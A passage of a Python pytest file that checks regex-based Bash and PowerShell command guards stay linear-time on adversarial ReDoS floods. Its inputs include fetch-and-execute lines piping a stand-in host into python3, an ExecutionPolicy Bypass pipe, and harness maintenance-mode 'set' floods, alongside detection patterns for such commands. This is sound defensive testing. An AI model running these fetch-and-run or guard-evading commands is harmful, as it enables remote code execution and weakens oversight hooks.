    ceiling still fits in it, so the row's calls end by the budget, and the
    budget plus one more ceiling is under the timeout. From below, the time in
    which a call may start (the budget less a ceiling) stays at least three times
    the slowest healthy label measured on CI, so a raised ceiling or margin that
    would red a healthy slow runner reds here first, naming the budget. The stop
    check's boundary is driven: a call that would end exactly at the deadline
    starts, one a millisecond later does not."""
    timeout_s = _pyproject_timeout_s()
    assert timeout_s > 0, "pyproject.toml declares no pytest timeout"
    budget_s = _walker_row_budget_s(timeout_s)
    assert budget_s is not None and 0 < budget_s, budget_s
    assert budget_s + _WALKER_CEILING_MS / 1000.0 < timeout_s, (budget_s, timeout_s)
    start_by_s = budget_s - _WALKER_CEILING_MS / 1000.0
    assert start_by_s >= 3 * _WALKER_LABEL_CI_MAX_S, (
        f"the walker row may start a call only until {start_by_s:.1f}s, under three times the "
        f"{_WALKER_LABEL_CI_MAX_S}s a healthy label took on CI: a raised ceiling or margin leaves a "
        "slow runner too little budget; re-read _walker_row_budget_s")
    assert _walker_row_budget_s(0.0) is None  # no timeout, nothing kills the row
    ceiling_s = _WALKER_CEILING_MS / 1000.0
    for clock, stops in ((10.0 - ceiling_s, False), (10.0 - ceiling_s + 0.001, True)):
        monkeypatch.setattr(sys.modules[__name__], "_walker_clock", lambda c=clock: c)
        try:
            _check_walker_budget(10.0, "here")
            stopped = False
        except _WalkerBudgetSpent:
            stopped = True
        assert stopped is stops, (clock, stopped)


@pytest.mark.parametrize("t_zero, t_small, swamped", [
    # DEF-926's incident: most of 196.1 ms was the per-call rebuild -- a slow host
    pytest.param(195.0, 196.1, True, id="swamped-slow-runner-skips"),
    # a box faster than the floors' host: under the floor, with its re-measure remedy
    pytest.param(0.5, 1.5, False, id="fast-box-reds"),
])
def test_walker_scaling_judgement_routes_an_under_floor_sample_by_cause(
        tmp_path, monkeypatch, t_zero, t_small, swamped):
    """The judgement's under-floor branch returns a swamped sample as
    ``unjudged`` (the row skips it with its cause) and any other as a
    ``problem`` (the row reds with the re-measure remedy), never both and
    never neither -- a swapped or dropped return retires the guard on the hosts
    it should red on (DEF-926; the failure-mode review of DEF-2000, which
    moved this branch into :func:`_walker_scaling_judgement`). On a stubbed
    one-call timer, so its windows need no alarm; its warm call is the real one
    under the alarm, so it skips on a host without SIGALRM."""
    cap = _BASH_COMMAND_CAP
    n_big, n_small = _walker_sizes(cap)
    costs = {64: t_zero, n_small: t_small, n_big: 2 * t_small}
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms",
                        lambda _consumer, payload, _root: costs[len(payload)])
    problem, unjudged = _walker_scaling_judgement(
        "stand_in", lambda _p, _r: None, cap, lambda n: "x" * n, tmp_path)
    if swamped:
        assert problem is None and unjudged is not None and "slow shared runner" in unjudged, (problem, unjudged)
    else:
        assert unjudged is None and problem is not None and "much faster" in problem, (problem, unjudged)


@pytest.mark.parametrize("pattern,payload", [
    (_PS_PYTHON_DASH_C_RE, 'python -c "open(\'x\',\'w\')"'),
    (_PS_PYTHON_DASH_C_RE, "py -3.12 -c 'open(\"x\",\"w\")'"),
    (_PS_PYTHON_DASH_C_RE, '& "C:\\Program Files\\Python312\\python.exe" -c "open(\'x\',\'w\')"'),
    (_PS_NODE_DASH_E_RE, "node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'"),
    (_PS_RUBY_DASH_E_RE, "ruby -e 'File.write(\"x\",\"y\")'"),
    (_PS_PERL_DASH_E_RE, "perl -e 'open(F, \">x\")'"),
    (_PS_INTERP_STDIN_RE, "@'\nx\n'@ | python -"),
    (_PS_INTERP_STDIN_RE, "'x' | pwsh -NoProfile -ExecutionPolicy Bypass -Command -"),
    (_PS_INTERP_STDIN_RE, "'x' | bash 2>&1"),
    (_PS_HERE_STRING_RE, "$x = @'\nline one\nline two\n'@"),
])
def test_ps_interpreter_regex_still_matches(pattern, payload):
    assert pattern.search(payload) is not None, payload


@pytest.mark.parametrize("pattern", [
    # (not `_PIPED_REMOVE_RE`: its anchor reads this flood in 3.4 s at 30 KB
    # on main as on the lane, the same filed-apart cost)
    _bash_patterns._FIND_DELETE_ACTION_RE, _bash_patterns._PIPED_CARRIER_WITNESS_RE,
    _bash_patterns._PS_PIPED_REMOVE_RE,
], ids=["find-exec", "witness", "ps-piped"])
def test_carrier_directory_wrapper_flood_is_linear_at_the_regex(pattern):
    """C76: `-exec /a/env` repeated, at the regex alone. Each `/a/env` could
    be the flag argument of the `-exec` before it or a wrapper step of its
    own until the carrier's flag lookahead declined a wrapper behind its
    directory (`_CARRIER_WRAP_ONE`): 34 s at 2 KB on the first draft, 15 ms
    at 32 KB after. Not a chain row: the whole reader is quadratic on this
    flood on main itself (7.7 s at 8 KB, measured 2026-11-07), a cost spread
    across the anchor-led patterns that is filed apart. POSIX-only."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    payload = "find . | " + "-exec /a/env " * (_WORST_CASE_BODY_LEN // 13)
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        pattern.search(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{pattern.pattern[:60]!r} exceeded {_CI_SAFE_BUDGET_MS}ms on the directory-wrapper flood")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS


@pytest.mark.parametrize(
    "name,pattern,verb", _VERB_EXTRACTION_REGEXES + _PS_VERB_EXTRACTION_REGEXES,
)
def test_verb_extraction_regex_linear_on_repeated_verb(name, pattern, verb):
    """Each verb-anchored extraction regex stays linear on a 30KB repeated-verb
    payload (the quadratic shape the third C2 adversarial round found).

    Isolated-regex pin (the chain re-confirmation is below); pre-fix these hit
    hundreds of ms to seconds. POSIX-only (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    payload = (verb + " ") * (_WORST_CASE_BODY_LEN // (len(verb) + 1))
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        pattern.findall(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"{name} regex exceeded {_CI_SAFE_BUDGET_MS}ms on a 30KB repeated-verb "
            f"payload (quadratic — verb-regex ReDoS class regressed)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{name} took {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("label,seed", [
    # a value holding `-`: two parses per token before the DEF-717 lookahead
    ("dash-value", "-a b-c "),
    # a value holding `/` AND `-`: more split points -- an ordinary Windows
    # argument (`c:/my-dir/run.ps1`), which is why this is not academic
    ("slash-dash-value", "-ArgumentList c:/x-y "),
])
def test_ps_switch_value_run_linear_on_dash_bearing_values(label, seed):
    """DEF-717's switch run lets a value's tail `[^\\s]*` admit `-` and `/`, the
    same characters that lead the next iteration. Without the trailing
    `(?=[ \\t]|$)` every such token has two parses inside one `*` loop and the
    run is exponential on failure: the first cut hung the deployed hook for
    20 s on a 305-byte command while a dash-free timing pin stayed green (code
    review, driven). ONE opener, a long run that never reaches a payload,
    isolated and through the real extractor. POSIX-only (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    payload = "Start-Process powershell " + seed * (_WORST_CASE_BODY_LEN // len(seed))
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        _PS_PATH_FLAG_RE.findall(payload)
        _candidate_paths_from_powershell(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"the PowerShell switch/value run exceeded {_CHAIN_CEILING_MS}ms on a "
            f"30KB {label} run (exponential -- the DEF-717 lookahead regressed)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS, f"{label} took {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("label,seed,tail", [
    # bare switches: a value never starts with `-`, so each token is a
    # switch and never the previous switch's value -- one parse
    ("short-switches", "-x ", ""),
    ("long-switches", "--norc ", ""),
    # the run reaches each opener's tail and fails on an unclosed program
    ("run-then-open-program", "-x ", "-c 'x"),
    ("run-then-herestring", "-x ", "<<<"),
    # DEF-3068's batch: a run AFTER the `-c` cluster too. Every `-c` cluster
    # can end either run, so a cluster holding `c` never opens a switch of
    # the run after it; without that refusal these were 4 to 11 s on both
    # tools' openers at 30 KB (mutant, driven), and they are milliseconds
    ("c-clusters-then-open-program", "-c ", "'x"),
    ("lc-clusters-then-open-program", "-lc ", "'x"),
    ("switch-and-cluster-alternating", "-x -c ", "'x"),
    ("cluster-and-dashdash-alternating", "-c -- ", "'x"),
    # a `+` option (DEF-3068's batch): a switch opens on `+` and a value
    # never does, on both tools' runs, so a `+` word is one parse
    ("plus-switches", "+x ", ""),
    ("plus-switch-values-then-open-program", "+O extglob ", "-c 'x"),
    ("plus-and-minus-alternating", "+x -x ", "-c 'x"),
    ("cluster-and-plus-alternating", "-c +e ", "'x"),
    # DEF-3074: the cluster opens on either sign, so a `+` cluster holding
    # `c` is refused by the run after it as a `-` one is; a refusal left on
    # `-` alone gave these 7 to 11 s at 30 KB (mutant, driven by the code
    # review), and they are milliseconds
    ("plus-c-clusters-then-open-program", "+c ", "'x"),
    ("plus-lc-clusters-then-open-program", "+lc ", "'x"),
    # DEF-3072's review batch: the pipe run's bare `--`, which only a bare
    # `--` opens (a switch refuses it), its argument words after it, and a
    # bare `+`, which a `+` switch's body never begins
    ("dashdash-then-words", "-- ", ""),
    ("switch-dashdash-cluster", "-x -- -lc ", "'x"),
    ("bare-plus", "+ ", "'x"),
    ("plus-switch-and-bare-plus", "+x + ", "'x"),
    # DEF-3077: the shared output-redirect run, after the switch run, read
    # by the pipe reader's lookahead and the here-string opener; each flood
    # ends on a character the run refuses, so it fails after reading the
    # whole run (6-15 ms at 30-40 KB on the Windows box, timed by hand)
    ("redirect-run", ">o 2>&1 ", "<"),
    ("redirect-gt-amp", ">&", "<"),
    ("redirect-amp-gt", "&>", "<"),
    ("redirect-gt-amp-gt", ">&>", "x<"),
    ("redirect-gt-pipe", ">|", "("),
    ("redirect-blank-target", ">  ", "<"),
    ("redirect-fd-digits", "2>1", "<"),
])
def test_posix_shell_switch_run_linear_on_one_head(label, seed, tail):
    """DEF-818: the POSIX shell openers' switch run (`bash -x ... -c '...'`,
    `bash -x ... <<< '...'`) is unbounded, because a bound let a program
    through behind 65 switches (`tests/test_write_guard.py::
    test_a_long_switch_run_does_not_hide_a_posix_shell_program`). One head and
    a 30 KB run, so the whole flood is one opener's run; isolated per opener
    (the PowerShell tool's `bash -c` opener among them, which shares the
    cluster) and through both extractors. A value that may start with `-`
    gives a switch run two parses per token and reds these rows. POSIX-only
    (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from _bash_patterns import _candidate_paths_from_bash  # noqa: E402
    from _bash_patterns import _candidate_paths_from_powershell  # noqa: E402

    import _speedbump  # noqa: E402

    payload = "bash " + seed * (_WORST_CASE_BODY_LEN // len(seed)) + tail
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        _bash_patterns._SHELL_DASH_C_RE.findall(payload)
        _bash_patterns._SHELL_HERESTRING_RE.findall(payload)
        _bash_patterns._PS_BASH_DASH_C_RE.findall(payload)
        # DEF-3072: the wall's pipe reader behind a pipe lead, and the two
        # bump arms that read a shell's switches
        _bash_patterns._INTERP_PIPE_RE.findall("x | " + payload)
        _speedbump._FETCH_EXEC_SUBST_RE.findall(payload)
        _speedbump._FETCH_EXEC_PROCSUB_RE.findall(payload)
        _candidate_paths_from_bash(payload)
        _candidate_paths_from_powershell(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"the POSIX shell switch run exceeded {_CHAIN_CEILING_MS}ms on a 30KB "
            f"{label} run behind one head (a switch value became ambiguous)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS, f"{label} took {elapsed_ms:.1f}ms"


def _redirect_flood(seed: str, lead: str = "", tail: str = "", scale: int = 1) -> str:
    return lead + seed * (scale * _WORST_CASE_BODY_LEN // len(seed)) + tail


_OUTPUT_REDIRECT_ROWS = [
    # the two quadratics both reviews drove on the first cut (a `>|` read as a
    # clobber and as a new pipe: 4.2 s at 18 KB; fd digits glued to the run
    # before them: 1.2 s at 40 KB, so those rows flood 60 KB, 3.2 s on the
    # first cut), and each sibling reader's run behind its head, ending where
    # the run refuses
    ("pipe-then-clobber-starts", "bp", "_INTERP_PIPE_RE", _redirect_flood("| sh >", "x ")),
    ("clobber-chain-of-heads", "bp", "_INTERP_PIPE_RE", _redirect_flood(">|sh", "x | sh")),
    ("digits-after-a-switch", "bp", "_INTERP_PIPE_RE", _redirect_flood("1", "x | bash -x ", "<", 2)),
    ("digits-after-an-interpreter", "bp", "_INTERP_PIPE_RE", _redirect_flood("1", "x | python", "<", 2)),
    ("digits-after-dashdash", "bp", "_INTERP_PIPE_RE", _redirect_flood("1", "x | bash -- ", "<", 2)),
    ("pipe-then-targets", "bp", "_INTERP_PIPE_RE", _redirect_flood("| sh >x ", "x ")),
    ("blank-led-digits", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 1", "x | bash >", "<")),
    ("heredoc-redirect-run", "bp", "_INTERP_STDIN_RE", _redirect_flood(">o 2>&1 ", "python3 - ", "x")),
    ("heredoc-blank-targets", "bp", "_INTERP_STDIN_RE", _redirect_flood(">  ", "python3 ", "x")),
    ("herestring-switches-then-run", "bp", "_SHELL_HERESTRING_RE", _redirect_flood("-o 1 ", "bash ", "2>&1 x")),
    ("herestring-redirect-run", "bp", "_SHELL_HERESTRING_RE", _redirect_flood(">o 2>&1 ", "bash ", "x")),
    ("fetch-scripter-run", "sb", "_FETCH_EXEC_PIPE_RE",
     _redirect_flood(">o 2>&1 ", "curl https://e.invalid/i | python3 ", "x")),
    ("fetch-scripter-blank-digits", "sb", "_FETCH_EXEC_PIPE_RE",
     _redirect_flood(" 1", "curl https://e.invalid/i | python3 >", "x")),
    # the pipe reader's switch runs interleave the unit (both reviews of the
    # widened lane): a redirect beside a switch, a value, the args after
    # `--` and the `-` operand, each ending where the run refuses; and the
    # PowerShell fetch target, which composes the Bash run
    ("pipe-switch-run-interleaved", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>&1 -x", "x | bash", " <")),
    ("pipe-switch-run-redirects-only", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>&1", "x | bash", " <")),
    ("pipe-switch-value-then-redirect", "bp", "_INTERP_PIPE_RE", _redirect_flood(" -o 2>f", "x | bash", " <")),
    ("pipe-dash-targets", "bp", "_INTERP_PIPE_RE", _redirect_flood(" > -x", "x | bash", " <")),
    ("pipe-interpreter-switches", "bp", "_INTERP_PIPE_RE", _redirect_flood(" -W 2>f", "x | python3", " <")),
    ("pipe-args-after-dashdash", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>1", "x | bash -s --", " <")),
    ("pipe-after-dash-operand", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>&1", "x | python3 -", " <")),
    ("pipe-quoted-targets", "bp", "_INTERP_STDIN_RE", _redirect_flood(" >'a b'", "python3 -", " x")),
    ("ps-fetch-composed-run", "sb", "_PS_FETCH_EXEC_PIPE_RE",
     _redirect_flood(">o 2>&1 ", "irm https://e.invalid/i | python3 ", "x")),
]


@pytest.mark.parametrize("label,owner,name,payload", _OUTPUT_REDIRECT_ROWS)
def test_output_redirect_run_linear_at_every_reader(label, owner, name, payload):
    """DEF-3077: the shared output-redirect run (`_OUTPUT_REDIRECT_RUN`) is
    one parse per redirect at each of its four readers, measured 2-25 ms per
    30-40 KB flood on the Windows box by hand. POSIX-only (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _speedbump  # noqa: E402

    pattern = getattr(_bash_patterns if owner == "bp" else _speedbump, name)
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        pattern.findall(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{name} exceeded {_CI_SAFE_BUDGET_MS}ms on the {label} flood")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label} took {elapsed_ms:.1f}ms"


_SWITCH_REDIRECT_ROWS = [
    # the switch-run sites (air's fb2b3f, sites 1, 2 and 4): a redirect whose
    # spaced target may open on `-` reads `> -x` two ways wherever a switch
    # arm sits beside the unit; a run that offers the unit twice reads every
    # redirect two ways where none does. Each row went past 15 s on the
    # mutant its comment names (a scratch copy, 30 KB) and ran 2-19 ms on the
    # lane, the Windows box by hand.
    # spaced target opening on `-`:
    ("inline-switch-run-dash-targets", "bp", "_PYTHON_DASH_C_RE", _redirect_flood("> -x ", "python3 ", "x")),
    ("inline-after-c-dash-targets", "bp", "_PYTHON_DASH_C_RE", _redirect_flood("> -x ", "python3 -c ", "<")),
    ("inline-after-e-dash-targets", "bp", "_NODE_DASH_E_RE", _redirect_flood("> -x ", "node -e ", "<")),
    ("shell-switch-run-dash-targets", "bp", "_SHELL_DASH_C_RE", _redirect_flood("> -x ", "bash ", "<")),
    ("shell-after-c-dash-targets", "bp", "_SHELL_DASH_C_RE", _redirect_flood("> -x ", "bash -c ", "<")),
    # the unit offered twice, in the run after `--` and the fetch bump's
    # eval and python arms:
    ("shell-after-dashdash-redirects", "bp", "_SHELL_DASH_C_RE", _redirect_flood("2>1 ", "bash -c -- ", "<")),
    ("eval-arm-redirects", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">o 2>&1 ", "eval ", "x")),
    ("python-arm-before-c", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">o 2>&1 ", "python3 ", "x")),
    ("python-arm-after-c", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">| ", "python3 -c ", "x")),
    # the sites the census below found with no row of their own (the
    # failure-mode review): the here-string reader, the process-substitution
    # arm, and the -e openers that share Node's tail
    ("herestring-dash-targets", "bp", "_SHELL_HERESTRING_RE", _redirect_flood("> -x ", "bash ", "x")),
    ("procsub-arm-redirects", "sb", "_FETCH_EXEC_PROCSUB_RE", _redirect_flood("2>/dev/null ", "bash ", "x")),
    ("ruby-after-e-dash-targets", "bp", "_RUBY_DASH_E_RE", _redirect_flood("> -x ", "ruby -e ", "<")),
    ("perl-after-e-dash-targets", "bp", "_PERL_DASH_E_RE", _redirect_flood("> -x ", "perl -e ", "<")),
]


def _patterns_composing(fragment: str) -> set[str]:
    """Every compiled module-level pattern in the two hook modules whose
    source holds ``fragment``."""
    import _speedbump  # noqa: E402

    return {name for mod in (_bash_patterns, _speedbump) for name, value in vars(mod).items()
            if isinstance(value, re.Pattern) and fragment in value.pattern}


def test_every_pattern_composing_a_redirect_unit_has_a_redos_row():
    """DEF-3077 (the failure-mode review): the rows above are a hand list,
    so a pattern that picks up either unit -- a new site, or one that
    composes a site transitively -- with no flood of its own would stay
    green. The set is derived from the compiled patterns' sources, so this
    reds the day one joins without a row. Runs on every platform."""
    composing = (_patterns_composing(_bash_patterns._SWITCH_REDIRECT)
                 | _patterns_composing(_bash_patterns._OUTPUT_REDIRECT_UNIT))
    rowed = {row[2] for row in _OUTPUT_REDIRECT_ROWS + _SWITCH_REDIRECT_ROWS}
    assert composing, "no pattern composes either unit: the census reads nothing"
    assert not composing - rowed, f"patterns composing a redirect unit with no ReDoS row: {sorted(composing - rowed)}"


def test_the_switch_redirect_lookahead_admits_every_arm_it_opens():
    """The unit opens on a lookahead of the characters a redirect starts
    with, for per-call cost (DEF-3077). An arm added that starts with any
    other character would be refused by it silently, so each operator the
    unit takes matches the same span with the lookahead and without it."""
    unit = _bash_patterns._SWITCH_REDIRECT
    head = "(?=[0-9{&<>])"
    assert unit.startswith(head), unit[:40]
    bare = re.compile(unit[len(head):])
    guarded = re.compile(unit)
    for word in ("2>x", "{fd}>x", "&>x", ">x", "<x", "<>x", ">>x", ">|x", "2>&1", "<&3", "12>x"):
        a, b = guarded.match(word), bare.match(word)
        assert a and b and a.span() == b.span(), word


@pytest.mark.parametrize("label,owner,name,payload", _SWITCH_REDIRECT_ROWS)
def test_switch_redirect_linear_at_every_switch_run_site(label, owner, name, payload):
    """DEF-3077: the redirect word in the shared switch runs
    (`_SWITCH_REDIRECT`) is one parse per redirect at each site that carries
    it: the inline openers' switch run and their `-c`/`-e` joints, the POSIX
    shell switch runs before and after `-c` and after `--`, and the fetch
    bump's eval and python arms. POSIX-only (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _speedbump  # noqa: E402

    pattern = getattr(_bash_patterns if owner == "bp" else _speedbump, name)
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        pattern.findall(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{name} exceeded {_CI_SAFE_BUDGET_MS}ms on the {label} flood")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label} took {elapsed_ms:.1f}ms"


_HEAD_SPELLING_FLOOD_LEN = 2 * _WORST_CASE_BODY_LEN


@pytest.mark.parametrize("label,verb", [
    # a head behind a directory: each opens a start through the `sh -c` exec
    # arm or the verb prefix, and is a value of the `-c` before it
    ("slashed-head", "/sh -c"),
    ("relative-dir-head", "a/sh -c"),
    # an `.exe` or another case, opened behind a wrapper's path
    ("wrapper-exe-head", "/a/env -x sh.exe -x"),
    ("wrapper-upper-head", "/a/ENV -x SH -x"),
    ("wrapper-upper-exe-head", "/a/env -x SH.EXE -x"),
])
def test_posix_shell_switch_value_is_never_a_head_spelling(label, verb):
    """DEF-818's code review: with the run unbounded, a switch value that is
    a spelling of a shell head (a directory before it, an `.exe`, another
    case) opens another start whose run reads the rest of the flood -- the
    starts x run-length product, 2-6 s at 30 KB on each opener when the
    refusal took the bare lower-case word alone. 60 KB, isolated per opener,
    so the quadratic is about four times the 30 KB figure and the wrapper
    rows (about one second at 30 KB) red with margin. POSIX-only
    (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _speedbump  # noqa: E402

    payload = (verb + " ") * (_HEAD_SPELLING_FLOOD_LEN // (len(verb) + 1))
    # the bump's substitution arm composes the same run (DEF-3072), linear
    # only while its shell heads stay a subset of the run's refused spellings
    for pattern in (_bash_patterns._SHELL_DASH_C_RE, _bash_patterns._SHELL_HERESTRING_RE,
                    _speedbump._FETCH_EXEC_SUBST_RE):
        signal.signal(signal.SIGALRM, _alarm)
        signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
        t = time.time()
        try:
            pattern.findall(payload)
            elapsed_ms = (time.time() - t) * 1000
        except _Timeout:
            pytest.fail(
                f"a POSIX shell opener exceeded {_CI_SAFE_BUDGET_MS}ms on a 60KB {label} "
                f"flood (a head spelling became a switch value)"
            )
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label} took {elapsed_ms:.1f}ms"


def _cmd_set_check(payload: str) -> bool:
    """The cmd `set` check alone over a Bash command, as the hard tier
    hands it the masked, spliced scan."""
    write_guard._load_the_pattern_path()
    bp = write_guard._bash_patterns
    return write_guard._cmd_set_launches_claude(
        bp.splice_line_continuations(bp.mask_inert_syntax(payload)), bash=True)


@pytest.mark.parametrize("label,unit", [
    ("set-flood", "& set ESPALIER_MAINTENANCE_MODE=1 "),
    ("call-set-flood", "& call set ESPALIER_STOP_GATE=full "),
    ("set-and-words-flood", "&set ESPALIER_MAINTENANCE_MODE=1 x x x x x x x "),
])
def test_the_cmd_set_check_scales_linearly_on_a_set_flood(label, unit):
    """DEF-1071's flood: the cmd `set` check re-read the rest of the program
    for a launch from every `set` it found at a statement start, so a run of
    harness `set` units was quadratic (the row: about 6 s at about 10 KB on
    2026-10-03; at 3a83b07 on the Windows box 730 / 3046 ms at 30 / 60 KB,
    and 1319 / 6184 ms with words between, past the chain ceiling). Read by
    cmd's own statement split since DEF-1071 wave 1, each statement once:
    7.1 / 14.1 and 9.2 / 18.8 ms. Judged by the pair rule on the check alone,
    at four and two times the cap, so the linear reader's half-size sample
    clears the sample floor on a host twice as fast (the hook's cap is the
    entry's, not the reader's). POSIX-only (signal.alarm). Who: the operator
    whose pasted cmd script of `set` lines a quadratic check would hold past
    the time budget."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")

    def make(n: int) -> str:
        return "cmd //c '" + unit * (n // len(unit)) + "'"

    verdict = _ps_body_scaling_verdict(
        _cmd_set_check, make(4 * _WORST_CASE_BODY_LEN), make(2 * _WORST_CASE_BODY_LEN), make(64),
    )
    assert verdict is None, f"{label}: {verdict}"


def _ps_cmd_set_check(payload: str) -> bool:
    """The cmd `set` check alone over a PowerShell command, as the hard tier
    hands it the scan pair."""
    write_guard._load_the_pattern_path()
    raw, scan = write_guard._bash_patterns.powershell_scan_pair(payload)
    return write_guard._cmd_set_launches_claude(scan, bash=False, raw=raw)


def test_the_cmd_set_check_reads_an_opener_flood_once():
    """The set check reads each program to its outer statement's end, past a
    later opener, and skips an opener inside a program already read; without
    the skip a run of openers in one statement is re-read from each, and an
    assignment-prefixed flood on PowerShell went from 28 ms to 51 s at 60 KB
    (the code review, the skip removed in memory; no polarity row reds on its
    removal, so this row is its pin). Pair rule on the check alone, as the
    set flood's. Who: the operator whose generated script starts cmd once a
    line inside one statement."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    unit = "$a = cmd /c x "

    def make(n: int) -> str:
        return unit * (n // len(unit))

    verdict = _ps_body_scaling_verdict(
        _ps_cmd_set_check, make(4 * _WORST_CASE_BODY_LEN), make(2 * _WORST_CASE_BODY_LEN), make(64),
    )
    assert verdict is None, f"opener-flood: {verdict}"


@pytest.mark.parametrize("label,seed", [
    # the cmdlet word in a valued parameter: the exec-quote arm opens a
    # command position at each, and each walked to the statement's end
    ("verb-flood", "Start-Process -Verb "),
    ("alias-flood", "saps -Wait -Verb "),
    ("working-directory-flood", "Start-Process pwsh -WorkingDirectory "),
])
def test_the_started_shell_reader_is_linear_on_an_opener_flood(label, seed):
    """DEF-3011's reader (`ps_start_process_shell_launches`) walks a
    started program's parameters from each cmdlet opener; unbounded, a
    flood of the cmdlet word in parameter values was quadratic -- 1.2 s at
    2000 openers for the reader, about 4 s on 20 KB for the four tiers --
    where the walk is now bounded and an opener inside an earlier walk is
    skipped (the code review, timed). Through the real entrypoints, under
    the chain ceiling. POSIX-only (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    payload = seed * (_WORST_CASE_BODY_LEN // len(seed))
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        raw, scan = _bash_patterns.powershell_scan_pair(payload)
        list(_bash_patterns._ps_start_process_launches(raw, scan))   # uncached, so it runs
        _candidate_paths_from_powershell(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"the started-shell reader exceeded {_CHAIN_CEILING_MS}ms on a 30KB "
            f"{label} (quadratic -- the bounded walk regressed)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS, f"{label} took {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("name,_pattern,verb", _VERB_EXTRACTION_REGEXES)
def test_verb_extraction_regex_linear_through_chain(name, _pattern, verb):
    """End-to-end: a ~28KB repeated-verb command stays inside the chain ceiling through the real
    bp._candidate_paths_from_bash entrypoint (the authoritative reachability)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from _bash_patterns import _candidate_paths_from_bash  # noqa: E402

    command = (verb + " ") * (28000 // (len(verb) + 1))
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        _candidate_paths_from_bash(command)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"_candidate_paths_from_bash exceeded {_CHAIN_CEILING_MS}ms on a repeated {verb!r} "
            f"command — verb-regex ReDoS class ({name}) regressed (TP-169 §13 #5)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS


@pytest.mark.parametrize("name,_pattern,verb", _PS_VERB_EXTRACTION_REGEXES)
def test_ps_verb_extraction_regex_linear_through_chain(name, _pattern, verb):
    """End-to-end for the PowerShell rows: a ~28KB repeated-verb command stays
    inside the chain ceiling through `_candidate_paths_from_powershell` -- the entrypoint that
    actually runs these regexes (masking, cap, per-match segment slice)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
